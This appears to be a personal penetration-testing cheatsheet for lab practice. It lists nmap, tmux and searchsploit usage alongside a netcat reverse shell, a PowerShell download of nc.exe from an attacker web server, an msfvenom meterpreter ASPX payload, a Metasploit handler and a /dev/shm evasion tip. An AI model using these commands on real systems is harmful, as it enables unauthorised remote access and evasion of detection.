# Cheatsheet

## Evaluation
```bash
# Shows version information
nmap -sC -sV -oA <name> <ip>
```

## Reverse shell

Listen locally with nc
```bash
# n is important!
nc -lvnp 4444
```

Remote (Windows):
```
nc.exe -e cmd.exe <local ip> 4444
```

Python web server and download with PS

```
python3 -m http.server 80
powershell Invoke-Webrequest -OutFile C:\temp\nc.exe -Uri http://10.10.14.116/nc.exe"
```

## Interactive terminal

Using Python for a psuedo terminal

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

## Sharing files
```
python3 -m http.server 8000
```

# Exploits
```bash
# local exploit-db
searchsploit "service name"
# show code of exploit
searchsplot -x <path number>
```

# Tools
https://github.com/infodox/python-pty-shells

## tmux
```bash
# new session
tmux new -s <name>
# list
tmux ls
# attach
tmux attach -t <name>

## tmux options
run-shell /opt/tmux-logging/logging.tmux
```
prefix key: ctrl+b
|Purpose|Prefix|
|-|-|
|c|new tab|
|[0-9]|go to tab n|
|d|detach|
|%|vertical split|
|"|horizontal split|
|arrow keys|move to pane|
|z|toggle zoom into pane|
|x|kill pane|
|$|rename session|
|,|rename tab|
|space|cycle looks|
|t|show time|
|:set -g mouse on|enable mouse|

## msfvenom
Payload generator
example aspx generator for reverse shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx > shell.aspx
```

## msfconsole
```bash
# Generic reverse shell for use with the payload.
use exploit/multi/handler

# Suggest working exploits for detected version
use post/multi/recon/local_exploit_suggester
```

# Detection evasion
## Linux
`/dev/shm` is a ramdisk -> not saved for ever

# Note keeping
Cherry Tree - Hierarchical tool with code highlight and screen capture
ctrl+shift+prtscr for screenshot selection

# Resources
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet